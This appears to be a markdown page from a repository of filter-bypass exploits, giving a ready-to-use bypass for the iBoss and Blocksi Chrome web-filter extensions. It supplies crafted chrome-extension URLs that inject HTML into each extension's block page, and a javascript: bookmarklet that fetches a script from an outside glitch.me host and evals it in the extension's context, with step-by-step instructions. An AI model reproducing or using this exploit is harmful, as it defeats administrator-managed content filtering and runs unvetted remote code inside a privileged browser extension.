### iBoss and Blocksi Bypass
For IBoss: <br>
```js
chrome-extension://kmffehbidlalibfeklaefnckpidbodff/restricted.html?re=1&bc=%3Ca+href=%22about:blank%22%20rel=%22opener%22%20target=%22_blank%22%3EThe%20Blue%20Hat%20Crew%20is%20the%20best!%3C/a%3E
```
For Blocksi: <br>
```js
chrome-extension://ghlpmldmjjhmdgmneoaibbegkjjbonbk/pages/blockPage.html?blockurl={%22hostname%22:%22%3Ca%20href=%27//%27%20rel=%27opener%27%20target=%27_blank%27%3ETheBlueHatCrewIsTheBest%3C/a%3E%22}
```
Code: <br>
```js
javascript:opener.eval(`fetch("https://rounded-boiling-flax.glitch.me/uboss.js").then(data=>{data.text().then(e=>{eval(e)})})`) && close();
```
Instructions: <br>
1. Go to the website that matches the extension you have.
2. Bookmark the javascript then run it on that extension page.
3. Follow the instructions.

<br> **Back to [README file](https://github.com/wea-f/ByePassHub/blob/main/Exploits/README.md)** (The starting file)
